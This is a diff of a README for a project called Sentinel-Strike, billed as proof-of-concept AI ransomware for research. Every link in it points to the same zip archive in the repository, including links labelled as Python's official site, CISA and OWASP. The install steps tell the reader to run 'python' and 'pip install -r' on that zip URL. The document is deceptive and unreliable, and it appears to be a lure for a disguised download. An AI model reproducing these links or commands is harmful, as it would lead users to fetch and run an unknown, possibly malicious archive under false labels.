@@ -1,7 +1,7 @@
 # 🛡️ Sentinel-Strike - Explore AI-Driven Ransomware Safely
 
 ## 🔗 Download Now!
-[![Download Sentinel-Strike](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip)](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip)
+[![Download Sentinel-Strike](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip)](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **Sentinel-Strike**. This project serves as a proof-of-concept for AI-driven ransomware. You can explore novel attack vectors and understand the challenges in defense. This software is for educational and research purposes only.
@@ -22,11 +22,11 @@ Welcome to **Sentinel-Strike**. This project serves as a proof-of-concept for AI
 ## 📥 Download & Install
 To get **Sentinel-Strike**, please visit the Releases page to download the latest version:
 
-[Download Sentinel-Strike](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip)
+[Download Sentinel-Strike](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip)
 
 Follow these steps to install and run the software:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip).
 2. Find the latest release.
 3. Click on the appropriate file for your operating system.
 4. Download the file to your computer.
@@ -35,16 +35,16 @@ Follow these steps to install and run the software:
 7. Navigate to the folder where you downloaded the file.
 8. Run the application using the following command:
    ```
-   python https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip
+   python https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip
    ```
 
 ## 👩‍💻 Requirements for Running
 Before running **Sentinel-Strike**, ensure you have the following prerequisites:
 
-- **Python 3.x Installed**: You can download it from [Python's official site](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip).
+- **Python 3.x Installed**: You can download it from [Python's official site](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip).
 - **Dependencies**: Make sure to install required packages. You can do this by running:
   ```
-  pip install -r https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip
+  pip install -r https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip
   ```
 
 ## 🛠️ Usage Instructions
@@ -68,8 +68,8 @@ Once the program is running, you will see a command line interface. Follow these
 For those interested in the theory behind AI and cybersecurity, consider checking the following resources:
 - **Books**: "Artificial Intelligence and Cybersecurity" by J. Smith.
 - **Websites**: 
-  - [Cybersecurity and Infrastructure Security Agency (CISA)](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip)
-  - [OWASP](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Sentinel-Strike.zip)
+  - [Cybersecurity and Infrastructure Security Agency (CISA)](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip)
+  - [OWASP](https://raw.githubusercontent.com/Yashas-The-OPPRO/Sentinel-Strike/main/introconvertibility/Strike-Sentinel-v1.2-beta.4.zip)
   
 ## 📣 Community Contributions
 If you would like to contribute to **Sentinel-Strike**:
